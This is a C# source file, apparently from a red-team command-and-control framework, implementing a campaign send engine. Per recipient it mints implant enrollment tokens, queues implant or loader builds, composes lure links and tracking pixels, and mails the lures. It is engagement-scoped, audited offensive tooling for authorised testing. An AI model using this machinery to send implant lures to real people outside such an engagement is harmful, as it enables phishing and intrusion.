using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Rod.Audit;
using Rod.BuildPipeline.PayloadBuild;
using Rod.CoreState;
using Rod.CoreState.Campaigns;
using Rod.CoreState.Deployment;
using Rod.CoreState.Engagements;
using Rod.CoreState.Live;
using Rod.CoreState.Operators;
using Rod.Transport.Endpoints;
using Rod.Transport.Listeners;
using Rod.Transport.Payloads;
using Task = System.Threading.Tasks.Task;

namespace Rod.Transport.Campaigns;

// The domain's task entity shadows the BCL name; the engine speaks the BCL
// one throughout.

/// <summary>
/// The delivery campaign's send engine (architecture.md Sec 11.5): one
/// hosted background service that walks launched campaigns on a fixed-delay
/// tick, drives one build per recipient through the build pipeline's job
/// queue, and on the build's completion renders and sends the message
/// through the campaign's relay. The webhook engine's shape -- a reconciler,
/// not a queue: it re-reads the store every tick, holds no state of its
/// own, and every state change lands as an audit fact.
///
/// Delivery is single-attempt with no retry: a failure is terminal on the
/// recipient row with its reason, and a retry is a new campaign -- the
/// trail stays the record, exactly as webhook delivery keeps it. Builds
/// ride the process-local job registry: a job lost to a restart is
/// re-requested with a fresh credential, not reconstructed.
/// </summary>
public sealed class CampaignSendEngine : BackgroundService
{
    private readonly ICampaignStore _campaigns;
    private readonly IEngagementRepository _engagements;
    private readonly IDeployTokenService _tokens;
    private readonly IListenerRegistry _listeners;
    private readonly Rod.CoreState.Pki.IImplantCertificateAuthority _ca;
    private readonly IPayloadStore _payloads;
    private readonly PayloadBuildJobService _jobs;
    private readonly CampaignMailSender _mail;
    private readonly IAuditStore _audit;
    private readonly ILiveEventBus _live;
    private readonly TimeProvider _clock;
    private readonly CampaignsOptions _options;
    private readonly Listeners.WireGuard.WireGuardOptions _wireGuard;
    private readonly Listeners.WireGuard.WireGuardTunnelRegistry _wireGuardTunnels;
    private readonly ILogger<CampaignSendEngine> _logger;

    // One scan at a time. The hosted loop and a direct test drive can land
    // on the same tick; serializing them keeps a recipient that just went
    // terminal from being sent twice by two scans that both read it live.
    private readonly SemaphoreSlim _scan = new(1, 1);

    public CampaignSendEngine(
        ICampaignStore campaigns,
        IEngagementRepository engagements,
        IDeployTokenService tokens,
        IListenerRegistry listeners,
        Rod.CoreState.Pki.IImplantCertificateAuthority ca,
        IPayloadStore payloads,
        PayloadBuildJobService jobs,
        CampaignMailSender mail,
        IAuditStore audit,
        ILiveEventBus live,
        TimeProvider clock,
        IOptions<CampaignsOptions> options,
        Listeners.WireGuard.WireGuardOptions wireGuard,
        Listeners.WireGuard.WireGuardTunnelRegistry wireGuardTunnels,
        ILogger<CampaignSendEngine> logger)
    {
        _campaigns = campaigns;
        _engagements = engagements;
        _tokens = tokens;
        _listeners = listeners;
        _ca = ca;
        _payloads = payloads;
        _jobs = jobs;
        _mail = mail;
        _audit = audit;
        _live = live;
        _clock = clock;
        _options = options.Value;
        _wireGuard = wireGuard;
        _wireGuardTunnels = wireGuardTunnels;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        var tick = TimeSpan.FromSeconds(Math.Max(1, _options.EngineTickSeconds));
        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                await TickOnceAsync(stoppingToken);
            }
            catch (OperationCanceledException) when (stoppingToken.IsCancellationRequested)
            {
                break;
            }
            catch (Exception ex)
            {
                // A failed tick costs one scan, never the engine: the loop
                // rides on and the next tick re-reads the store.
                _logger.LogError(ex, "Campaign send engine tick failed.");
            }

            try
            {
                await Task.Delay(tick, stoppingToken);
            }
            catch (OperationCanceledException) when (stoppingToken.IsCancellationRequested)
            {
                break;
            }
        }
    }

    /// <summary>
    /// One scan of the launched campaigns. Public because the tests drive
    /// it directly -- a tick is a pure scan of the store, so the loop around
    /// it is timing and nothing else.
    /// </summary>
    public async Task TickOnceAsync(CancellationToken cancellationToken = default)
    {
        await _scan.WaitAsync(cancellationToken);
        try
        {
            await ScanAsync(cancellationToken);
        }
        finally
        {
            _scan.Release();
        }
    }

    private async Task ScanAsync(CancellationToken cancellationToken)
    {
        foreach (var campaign in await _campaigns.ListLaunchedAsync(cancellationToken))
        {
            // A closed engagement accepts no new deployments -- the sends
            // stop with it; the campaign stays launched and its evidence
            // continues to land, exactly as an enrollment on a closed
            // engagement is refused rather than torn down.
            var engagement = await _engagements.FindAsync(campaign.EngagementId, cancellationToken);
            if (engagement is null || engagement.IsClosed)
                continue;

            foreach (var recipient in campaign.Recipients)
            {
                switch (recipient.Status)
                {
                    case CampaignRecipientStatus.Pending:
                        await SubmitBuildAsync(campaign, recipient, engagement.OwnerId, cancellationToken);
                        break;
                    case CampaignRecipientStatus.Building:
                        await DriveBuildingAsync(campaign, recipient, engagement.OwnerId, cancellationToken);
                        break;
                }
            }

            await _campaigns.TryCompleteAsync(campaign.Id, _clock.GetUtcNow(), cancellationToken);
        }
    }

    // The first move of a recipient's arc: mint the per-recipient enrollment
    // credential, parse the campaign's build profile with the build
    // pipeline's own parser (listener names resolve fresh, so a repointed
    // front bakes into the artifact), and enqueue the job.
    private async Task SubmitBuildAsync(
        Campaign campaign,
        CampaignRecipient recipient,
        OperatorId owner,
        CancellationToken cancellationToken)
    {
        // A parse refusal is terminal for the recipient, not the campaign:
        // the create-time dry parse passed, so a refusal here means the world
        // moved (the listener was deleted, the loader's delivered payload is gone).
        var (build, parseError) = await ParseBuildAsync(campaign, owner, cancellationToken);
        if (parseError is not null)
        {
            await FailAsync(campaign, recipient, $"build: {parseError}", cancellationToken);
            return;
        }

        // The mint mirrors the build pipeline's own (single use, the
        // artifact's kill window or the 30-day open-ended default),
        // attributed to the engagement owner the way every baked mint is,
        // with the fact naming the campaign and the recipient -- the secret
        // itself never travels anywhere but into the baked profile.
        var now = _clock.GetUtcNow();
        var killDate = PayloadBuildService.ResolveKillDate(now, build!.KillDate);
        var token = await _tokens.MintAsync(
            campaign.EngagementId, owner, now,
            maxUses: 1,
            lifetime: killDate - now ?? TimeSpan.FromDays(30),
            cancellationToken: cancellationToken);
        await _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: campaign.EngagementId.Value,
                operatorId: owner.Value,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "mint-deploy-token",
                kind: AuditEventKind.DeployTokenMinted,
                payload: $"bakedForCampaign '{campaign.Name}' ({campaign.Id}) recipient={recipient.Email} maxUses=1",
                output: null,
                outcome: token.Id.ToString(),
                at: now),
            cancellationToken);

        var request = build with
        {
            TokenSecret = token.Secret,
            MintedTokenId = token.Id.Value,
            TokenMaxUses = 1,
        };
        // The per-artifact envelope key whenever a phase needs it -- the same
        // mint the synchronous and queued build paths perform.
        if (request.Transport.Envelope == TransportEnvelope.AesGcm
            || request.Transport.ContactProtection
            || request.Kind == PayloadKind.Loader)
        {
            var (envelopeKeyId, envelopeKey) = AesGcmEnvelope.Mint();
            request = request with { EnvelopeKeyId = envelopeKeyId, EnvelopeKey = envelopeKey };
        }

        var job = _jobs.Enqueue(request);
        await _campaigns.NoteBuildingAsync(campaign.Id, recipient.Id, token.Id, job.JobId, cancellationToken);
    }

    // The second move: the build's job landed (or failed, or vanished with a
    // restart) -- a completed build renders and sends the message; anything
    // else terminal fails the recipient; a vanished job re-submits with a
    // fresh credential.
    private async Task DriveBuildingAsync(
        Campaign campaign,
        CampaignRecipient recipient,
        OperatorId owner,
        CancellationToken cancellationToken)
    {
        var job = recipient.JobId is { } jobId
            ? _jobs.Find(campaign.EngagementId.Value, jobId)
            : null;

        if (job is null)
        {
            // The job registry is process-local by design; a restart drops
            // in-flight jobs. The recipient re-enters the arc at submission
            // with a fresh credential -- the stale binding is overwritten.
            await SubmitBuildAsync(campaign, recipient, owner, cancellationToken);
            return;
        }

        if (job.State == PayloadBuildJobState.Completed && job.Artifact is { } artifact)
        {
            await SendAsync(campaign, recipient, Guid.Parse(artifact.ArtifactId), cancellationToken);
            return;
        }

        if (job.State == PayloadBuildJobState.Failed)
        {
            await FailAsync(campaign, recipient, $"build: {job.Error}", cancellationToken);
        }

        // Queued or running: the single build worker owns it; the next tick
        // looks again.
    }

    // The send: compose the lure URLs off the listener's current public
    // endpoint, render the template per recipient, inject the pixel into an
    // HTML body that did not place one, and make the single attempt.
    private async Task SendAsync(
        Campaign campaign,
        CampaignRecipient recipient,
        Guid payloadId,
        CancellationToken cancellationToken)
    {
        var listener = await _listeners.FindAsync(new ListenerId(campaign.ListenerId), cancellationToken);
        if (listener is null)
        {
            await FailAsync(campaign, recipient, "send: the campaign's listener no longer exists", cancellationToken);
            return;
        }

        var endpoint = listener.PublicEndpoint.TrimEnd('/');
        var link = $"{endpoint}/implants/lures/{recipient.LureId:N}";
        var pixel = $"{link}/open";
        var subject = CampaignLimits.Render(campaign.Subject, link, pixel, recipient.Email, recipient.Name);
        var body = CampaignLimits.Render(campaign.Body, link, pixel, recipient.Email, recipient.Name);
        if (campaign.BodyIsHtml && !CampaignLimits.Merges(campaign.Body, "pixel"))
            body = CampaignLimits.AppendPixel(body, pixel);

        var at = _clock.GetUtcNow();
        try
        {
            await _mail.SendAsync(
                campaign, recipient.Email, recipient.Name ?? string.Empty, subject, body,
                TimeSpan.FromSeconds(Math.Max(1, _options.SendTimeoutSeconds)), cancellationToken);
        }
        catch (Exception ex) when (ex is not OperationCanceledException || !cancellationToken.IsCancellationRequested)
        {
            var reason = ReasonOf(ex);
            await _campaigns.NoteFailedAsync(campaign.Id, recipient.Id, $"send: {reason}", at, cancellationToken);
            await RecordSendAsync(campaign, recipient, at, $"failed:{ReasonOf(ex)}", cancellationToken);
            return;
        }

        await _campaigns.NoteSentAsync(campaign.Id, recipient.Id, payloadId, at, cancellationToken);
        await RecordSendAsync(campaign, recipient, at, "delivered", cancellationToken);
    }

    // Terminal failure from any non-terminal point: the row keeps the
    // reason (its caller qualified it -- build:/send:), the trail keeps the
    // fact, the console hears it live.
    private async Task FailAsync(
        Campaign campaign,
        CampaignRecipient recipient,
        string reason,
        CancellationToken cancellationToken)
    {
        var at = _clock.GetUtcNow();
        await _campaigns.NoteFailedAsync(campaign.Id, recipient.Id, reason, at, cancellationToken);
        await RecordSendAsync(campaign, recipient, at, $"failed:{reason}", cancellationToken);
    }

    private async Task RecordSendAsync(
        Campaign campaign,
        CampaignRecipient recipient,
        DateTimeOffset at,
        string outcome,
        CancellationToken cancellationToken)
    {
        await _audit.AppendAsync(
            AuditEvent.Fact(
                eventId: Guid.NewGuid(),
                engagementId: campaign.EngagementId.Value,
                operatorId: campaign.CreatedBy.Value,
                implantId: Guid.Empty,
                taskId: Guid.Empty,
                verb: "campaign.send",
                kind: AuditEventKind.CampaignMessageSent,
                payload: $"campaign='{campaign.Name}' ({campaign.Id}) recipient={recipient.Email}",
                output: null,
                outcome,
                at),
            cancellationToken);
        await _live.PublishAsync(
            LiveEvent.CampaignActivity(
                campaign.EngagementId,
                campaign.CreatedBy,
                $"{(outcome == "delivered" ? "sent" : outcome)} recipient={recipient.Email} campaign={campaign.Id}",
                at),
            cancellationToken);
    }

    private async Task<(BuildRequest? Request, string? Error)> ParseBuildAsync(
        Campaign campaign,
        OperatorId owner,
        CancellationToken cancellationToken)
    {
        PayloadEndpoints.BuildPayloadRequest? body;
        try
        {
            body = System.Text.Json.JsonSerializer.Deserialize<PayloadEndpoints.BuildPayloadRequest>(
                campaign.BuildRequestJson, JsonOptions);
        }
        catch (System.Text.Json.JsonException)
        {
            return (null, "the stored build profile is not readable");
        }
        if (body is null)
            return (null, "the stored build profile is empty");

        return await PayloadBuildRequestParser.ParseAsync(
            body, campaign.EngagementId, owner, _listeners, _ca, _payloads, cancellationToken,
            _wireGuard, _wireGuardTunnels);
    }

    internal static readonly System.Text.Json.JsonSerializerOptions JsonOptions =
        new(System.Text.Json.JsonSerializerDefaults.Web);

    // A one-line, bounded reason for the row: the exception's own message
    // trimmed, no stack, no inner-chain walk -- the log keeps the detail.
    private static string ReasonOf(Exception ex)
    {
        var message = ex.Message.Trim().ReplaceLineEndings(" ");
        return message.Length <= CampaignLimits.MaxFailureBytes - "send: ".Length
            ? message
            : message[..(CampaignLimits.MaxFailureBytes - "send: ".Length)];
    }
}
